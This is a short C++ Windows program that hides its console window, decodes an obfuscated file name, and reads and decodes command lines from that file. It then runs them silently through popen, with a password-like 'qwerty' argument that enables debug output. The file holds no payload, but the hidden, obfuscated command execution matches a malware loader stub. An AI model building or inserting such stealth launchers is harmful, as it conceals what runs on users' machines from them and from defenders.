#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <vector>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

FILE* pipe = NULL;
bool cons = false;

/*
 * ======= M A I N =======================
 */
int main (int argc, char** argv
) {
try {

if (argc > 1) {
    string arg(argv[1]);
    if (arg == "qwerty") cons = true;
}

if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );

static hide::line name("");
    name.decode();
    if (cons) cout << name << endl;
    ifstream  ini( name.c_str(), ios::in); 
    if ( !ini.is_open())
        throw runtime_error(name + ": file not open");

static hide::line arg, Args;
while ( getline(ini, arg)) {
    arg.decode();
    if (cons) cout << arg << endl;
    Args.append(arg);
}

Args.append(" 2>&1");
if (cons)
    throw runtime_error("^^^ eof");

pipe = ::popen( Args.c_str(), "r");
if (!pipe) throw runtime_error("");

::sleep(30);

return 0;
} catch (const exception& e) {
    cerr << e.what() << endl;
    if(pipe) pclose(pipe);
    return 1;
}}
